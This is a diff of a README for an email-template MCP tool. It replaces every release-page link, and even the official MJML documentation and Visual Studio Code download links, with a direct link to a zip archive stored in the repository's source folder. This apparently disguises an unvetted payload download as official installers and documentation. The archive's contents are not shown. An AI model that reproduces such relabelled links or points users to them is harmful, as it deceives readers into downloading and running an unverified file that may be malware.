@@ -1,6 +1,6 @@
 # 📧 email-design-mcp - Build Responsive Email Templates Easily
 
-[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip)
 
 ## 📋 What is email-design-mcp?
 
@@ -38,7 +38,7 @@ If you don’t have Visual Studio Code, you can still use the app’s basic feat
 
 Click the big download button below to visit the official release page. This page lists all versions available for Windows.
 
-[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -124,7 +124,7 @@ The MCP server will update automatically when you save any changes in VS Code.
 
 ## 🔄 Updating email-design-mcp
 
-- Check the [releases page](https://github.com/hema9265/email-design-mcp/releases) regularly for new versions.  
+- Check the [releases page](https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip) regularly for new versions.  
 - Download the latest installer and run it. It will replace your current version without deleting your projects.
 
 ## 📞 Getting Help
@@ -134,8 +134,8 @@ The MCP server will update automatically when you save any changes in VS Code.
 
 ## 🔗 Useful Links
 
-- Release Downloads: [https://github.com/hema9265/email-design-mcp/releases](https://github.com/hema9265/email-design-mcp/releases)  
-- Official MJML Documentation: https://mjml.io/documentation  
-- Visual Studio Code Download: https://code.visualstudio.com/  
+- Release Downloads: [https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip](https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip)  
+- Official MJML Documentation: https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip  
+- Visual Studio Code Download: https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip  
 
-[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/raw/refs/heads/main/src/resources/mcp-design-email-1.2.zip)
